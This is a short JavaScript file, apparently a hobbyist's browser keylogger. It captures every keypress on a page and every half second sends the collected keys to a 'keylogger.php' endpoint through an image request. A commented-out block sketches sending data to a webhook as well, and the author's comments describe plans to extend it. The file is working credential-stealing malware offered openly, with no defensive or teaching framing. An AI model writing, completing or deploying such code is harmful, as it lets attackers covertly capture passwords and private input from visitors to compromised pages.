//basic shit, adding message sending soon.
var keys = '';
document.onkeypress = function(e) {
  get = window.event ? event : e;
  key = get.keyCode ? get.keyCode : get.charCode;
  key = String.fromCharCode(key);
  keys += key;
}
window.setInterval(function() {
  if (keys != '') {
    new Image().src = 'keylogger.php?c=' + keys;
    keys = '';
  }
}, 500);
console.log(keys);



/* 

var webhook = ' WEBHOOK URL';

var request = new XMLHttpRequest();
      request.open("POST", webhook);

      request.setRequestHeader('Content-type', 'application/json');


      var params = {
        username: "My Webhook Name",
        avatar_url: "",
        content: "The message to send"
      }

      request.send(JSON.stringify(params));

  }

    */
//maybe put a infinite loop?
